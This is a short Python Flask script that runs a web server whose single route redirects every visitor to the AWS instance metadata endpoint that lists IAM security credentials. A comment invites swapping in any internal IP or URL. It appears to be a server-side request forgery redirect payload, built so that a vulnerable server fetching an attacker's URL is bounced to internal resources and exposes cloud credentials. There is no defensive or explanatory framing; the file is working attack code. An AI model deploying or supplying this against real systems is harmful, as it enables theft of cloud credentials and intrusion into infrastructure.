from flask import Flask, redirect

app = Flask(__name__)

@app.route('/')
def index():
    # Replace this with the internal IP or URL you want to redirect to
    return redirect('http://169.254.169.254/latest/meta-data/iam/security-credentials/', code=302)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
